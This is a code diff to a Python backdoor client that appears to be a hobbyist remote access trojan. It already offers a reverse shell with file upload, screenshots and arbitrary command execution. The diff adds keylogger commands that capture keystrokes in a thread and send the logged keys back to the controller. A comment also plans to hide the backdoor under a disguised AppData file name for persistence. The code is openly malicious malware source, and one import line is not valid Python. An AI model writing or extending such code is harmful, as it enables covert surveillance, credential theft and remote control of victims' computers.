@@ -10,7 +10,9 @@ import shutil
 import requests
 import time
 from mss import mss
+import threading
 
+from ../keylogger import keylogger
 
 # CHECK AGAIN DATA TYPES IN THIS SEND FUNCTION (BYTES OR STRING)
 # Sending data
@@ -73,6 +75,8 @@ def shell():
                             upload <path>       --> upload a file to bot
                             screenshot          --> take screenshot of bot
                             start <path>        --> start a program (Windows preferred)
+                            keylog_start        --> start the keylogger
+                            keylog_dump         --> dump the keystrokes file
                             q                   --> exit the reverse shell
                 """
 
@@ -119,11 +123,26 @@ def shell():
                 reliable_send("[+] Program Started!")
             except:
                 reliable_send("[-] Failed To Start!")
+        
+        # Start the keylogger 
+        elif command[:12] == "keylog_start":
+            t = threading.Thread(target=keylogger.start)
+            t.start()
+
+        # Dumping the keystrokes
+        elif command[:11] == "keylog_dump":
+            f = open(keylog_path, 'r')
+            reliable_send(f.read())
+            #maybe??
+            f.close()
+
         else:
             proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
             result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))
 
             reliable_send(result)
+
+keylog_path = "/temp/log_key.txt"
 
 # Code for hiding backdoor and being persistent (does not require yet!!!)
 # location = os.environ["AppData"] + "\\windows32.exe"
